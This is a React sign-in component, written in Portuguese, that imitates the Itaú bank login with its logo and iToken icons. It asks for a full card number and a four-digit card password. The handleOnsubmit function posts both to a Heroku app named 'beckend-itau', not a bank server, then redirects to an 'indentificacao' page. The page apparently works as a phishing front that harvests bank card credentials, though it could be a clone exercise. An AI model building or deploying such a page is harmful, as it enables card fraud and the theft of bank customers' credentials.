import React, { useState } from 'react';
import './SiginIn.css';
import Icon from '../../assets/ic_cadeado.png';
import LogoHome from '../../assets/img_home_logo.png';
import creditcard from '../../assets/ic_contact_card.png';
import itokenimg from '../../assets/ic_itokenapp.png';
import imgajuda from '../../assets/ic_ajuda.png';
import { mask } from 'remask';
import { useHistory } from 'react-router-dom';
import axios from 'axios';
export  function SignIn() {
    const [ password, setPassword ] = useState("");
    const [ masckcard, setMasckCard] =useState("");
    const [user_card, setUsercard] = useState([])


    const [ bolinha_1, setBolinha_1] = useState("#FFFF");
    const [ bolinha_2, setBolinha_2] = useState("#FFFF");
    const [ bolinha_3, setBolinha_3] = useState("#FFFF");
    const [ bolinha_4, setBolinha_4] = useState("#FFFF");
    const [ content, setContendt ] = useState(false);
    const history = useHistory();

    function handle(e){
        setPassword( e.target.value)
      
        if(password.length === 0){
            setContendt(true)
            setBolinha_1()
        }
        if(password.length === 1){
            setContendt(true)
            setBolinha_2()
        }
        if(password.length === 2){
            setContendt(true)
            setBolinha_3()
        }
        if(password.length === 3){
            setContendt(true)
            setBolinha_4()
        }    
}
    function handleOnchange(e){
        setMasckCard(mask(e.target.value, ['9999 9999 9999 9999']));
        setUsercard({...user_card, [e.target.name]: e.target.value})
        console.log(user_card)
    
    }
    function handleOnchange2(e){
        handle(e)
        setUsercard({...user_card, [e.target.name]: e.target.value});
    }

    async function handleOnsubmit(e){
        e.preventDefault()
        await  axios.post("https://beckend-itau.herokuapp.com/create_card",user_card)
        .then( (response)=>{
            history.push("/indentificacao")
            console.log(response)
        })
        .catch( (error)=>{
            console.log("ERRORU,", error)
        });

    };
  
 return (
    <div className="container">
        <img src={LogoHome} alt="logo-home" className="image_logo_home"/>
       <form>
           <div className="wrapper">
            <div className="input_data">
             <input type="text" name="number_card" id="name" className="input" required value={masckcard} onChange={handleOnchange} />
                <label className="name">número do cartão </label>
            </div>
            <div className="input_data">
             <input type="password" name="password_card" id="password" className="input"  onChange={handleOnchange2} />
                <label className="password">senha do cartão</label>
                <img src={Icon} className="icon"/>
                {
                    content ?  <div className="container_bolinhas">
                    <div className={bolinha_1 ? "bolinha1" : "bolinha01"}></div>
                    <div className={bolinha_2 ? "bolinha2" : "bolinha02"}></div>
                    <div className={bolinha_3 ? "bolinha3" : "bolinha03"}></div>
                    <div className={bolinha_4 ? "bolinha4" : "bolinha04"}></div>
                  </div> : ""
                }
            </div>
            <div className="container_button">
                <button type="submit" className="button_acessar" onClick={handleOnsubmit}><span className="text">acessar</span></button>
           </div>
           </div>

           
       </form>
       <footer className="footer">
           <div className="container_img_footer">
              <button className="button_img_fotter">
                 <img src={creditcard} alt="image_card" className="img_footer"/>
              </button>
              <button className="button_img_fotter">
                 <img src={itokenimg} alt="image_itoken" className="img_footer"/>
              </button>
              <button className="button_img_fotter">
                 <img src={imgajuda} alt="image_ajuda" className="img_footer"/>
              </button>
            
           </div>
       </footer>
   </div>
 );
}